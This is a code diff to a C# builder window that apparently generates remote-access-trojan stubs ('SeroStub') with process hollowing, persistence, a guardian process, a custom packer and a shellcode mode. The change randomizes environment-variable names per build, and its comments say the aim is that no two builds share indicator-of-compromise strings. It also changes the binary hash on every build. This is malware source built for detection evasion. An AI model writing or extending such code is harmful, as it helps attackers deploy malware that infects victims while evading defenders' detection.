@@ -3339,7 +3339,19 @@ public partial class ServerWindow : ThemedWindow
         return null;
     }
 
-    private string GenerateConfigCs()
+    private static string RandEnvKey()
+    {
+        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(10);
+        return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
+    }
+
+    private string GenerateConfigCs(
+        string eHollow        = "",
+        string ePersistWorker = "",
+        string eRelaunch      = "",
+        string eExe           = "",
+        string eGuardian      = "")
     {
         int.TryParse(BldPort.Text, out int port);
         int.TryParse(BldReconnectDelay.Text, out int reconnect);
@@ -3402,6 +3414,13 @@ internal static class Config
 
     // Unique per build — changes the compiled binary hash even with identical settings
     public const string BuildId = ""{Guid.NewGuid():N}"";
+
+    // Per-build env var names — randomized so no two builds share the same IoC strings
+    public const string EnvKeyHollow        = ""{eHollow}"";
+    public const string EnvKeyPersistWorker = ""{ePersistWorker}"";
+    public const string EnvKeyRelaunch      = ""{eRelaunch}"";
+    public const string EnvKeyExe           = ""{eExe}"";
+    public const string EnvKeyGuardian      = ""{eGuardian}"";
 
     public const int ReconnectDelayMs = {reconnect};
     public const int HeartbeatIntervalMs = 3000;
@@ -4147,7 +4166,12 @@ Read-Host 'Press Enter to close'
         try
         {
             var configPath = Path.Combine(stubDir, "Config.cs");
-            await File.WriteAllTextAsync(configPath, GenerateConfigCs());
+            var eHollow        = RandEnvKey();
+            var ePersistWorker = RandEnvKey();
+            var eRelaunch      = RandEnvKey();
+            var eExe           = RandEnvKey();
+            var eGuardian      = RandEnvKey();
+            await File.WriteAllTextAsync(configPath, GenerateConfigCs(eHollow, ePersistWorker, eRelaunch, eExe, eGuardian));
 
             var csprojPath = Path.Combine(stubDir, "SeroStub.csproj");
             var csproj = await File.ReadAllTextAsync(csprojPath);
@@ -4412,7 +4436,7 @@ Read-Host 'Press Enter to close'
             {
                 TxtBuildStatus.Text = Lang.Get("BLD_STATUS_PACKER");
                 Log("[*] Builder: Applying custom packer...");
-                await SeroServer.Builder.CustomPackerBuilder.ApplyAsync(workingExe, Log, iconForLoader, meta, GetHollowTarget());
+                await SeroServer.Builder.CustomPackerBuilder.ApplyAsync(workingExe, Log, iconForLoader, meta, GetHollowTarget(), eHollow);
             }
 
             if (shellcodeMode)
